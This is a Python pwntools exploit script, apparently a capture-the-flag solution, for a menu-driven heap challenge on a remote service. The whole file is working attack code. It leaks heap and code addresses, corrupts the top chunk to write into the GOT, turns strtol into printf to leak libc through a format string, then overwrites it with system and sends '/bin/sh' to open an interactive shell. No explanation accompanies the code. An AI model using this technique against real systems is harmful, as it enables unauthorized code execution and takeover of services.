#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
#host = "10.211.55.23"

#host = "10.0.0.18"
#port = 8888
#host = "140.113.209.3"
#port = 56746
#host = "10.211.55.23"
#port = 9999

r = remote(host,port)



r.recvuntil("-->")
r.sendline("1")
r.recvuntil("-->")
r.sendline("3")
r.recvuntil("-->")
r.sendline("128")
r.recvuntil("-->")
r.sendline("4")
r.recvuntil("-->")
r.sendline("2")
r.recvuntil("Large:")
data = r.recvuntil("-->")
heapbase = int(data.split("\n")[0].strip(),16) - 0x950
print "heapbase: ",hex(heapbase)
r.sendline("1")
r.recvuntil("-->")
r.sendline("1")
r.recvuntil("-->")
#r.sendline("a"*0xf0 + "\xff"*8 + "dddddddd" + "\x00"*0x30 + sc)
r.sendline("a"*0xf0 + "\xff"*8 )
r.recvuntil("-->")
top = heapbase + 0xae0
nb = heapbase + 0x10 - 8 - top - 0x10
r.sendline("3")
r.recvuntil("-->")
r.sendline(str(nb))

r.recvuntil("-->")
r.sendline("4")
r.recvuntil("-->")
r.sendline("1")
r.recvuntil("-->")
r.sendline("4")
r.recvuntil("-->")
r.sendline("2")
r.recvuntil("Large:")
r.recvuntil("Large:")
r.recvuntil("Large:")
data = r.recvuntil("-->")
codebase =  int(data.split("\n")[0].strip(),16) - 0xf54

print "codebase: ",hex(codebase)
r.sendline("1")
r.recvuntil("-->")
r.sendline("1")
r.recvuntil("-->")
r.sendline("a"*0xf0 + "\xff"*8)
top = heapbase + 0x220
stroll_got = codebase + 0x0000000000012270
#strcpy_got = codebase + 0x122d0
fuck = codebase + 0x12240
nb = stroll_got -8 - top - 0x10
printf = codebase + 0xc60
strtol_got = codebase + 0x122c0
r.recvuntil("-->")
r.sendline("3")
r.recvuntil("-->")
r.sendline(str(nb))
r.recvuntil("-->")
r.sendline("2")
r.recvuntil("-->")
r.sendline(p64(printf))
r.recvuntil("-->")
r.sendline("3")
r.recvuntil("-->")
r.sendline("%17$p")
data = r.recvuntil("-->")
#libc_start_main =  int(data.split("\n")[0].strip(),16) - 224
libc_start_main =  int(data.split("\n")[0].strip(),16) - 236
#libcbase = libc_start_main-0x1f7c0
libcbase = libc_start_main - 0x20c9c
print "libcbase : ",hex(libcbase)
system = libcbase + 0x3ffd0
#system = libcbase + 0x3d818
for i in range(6):
    r.sendline("3")
    r.recvuntil("-->")
    r.sendline("a"*0x80)
    r.recvuntil("-->")
r.sendline("3")
r.recvuntil("-->")
r.sendline("aa")
r.recvuntil("-->")
r.sendline("4")
r.recvuntil("-->")
r.sendline("1")
r.recvuntil("-->")
r.sendline("1")
r.recvuntil("-->")
r.sendline(p64(strtol_got))

time.sleep(1)
r.sendline("/bin/sh\x00" + p64(system))
time.sleep(1)
r.interactive()
